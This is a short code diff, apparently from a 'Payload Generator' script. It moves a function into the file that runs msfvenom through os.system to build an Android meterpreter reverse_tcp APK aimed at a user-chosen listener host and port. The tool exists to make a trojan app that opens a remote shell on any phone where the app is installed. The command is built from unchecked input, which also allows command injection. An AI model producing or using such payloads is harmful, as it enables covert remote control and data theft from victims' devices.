@@ -1,10 +1,12 @@
-from src.genPay import gen
 import pyfiglet
 import colorama
 from colorama import Fore
 from termcolor import colored
 from pyfiglet import Figlet
 from tkinter import *
+import os
+def gen(apkname,lhost,lport):
+    os.system(f'msfvenom -p android/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} R> {apkname}.apk')
 f=Figlet(font='standard')
 print(colored(f.renderText('Payload'),'blue'))
 print(colored(f.renderText('Generator'),'red'))
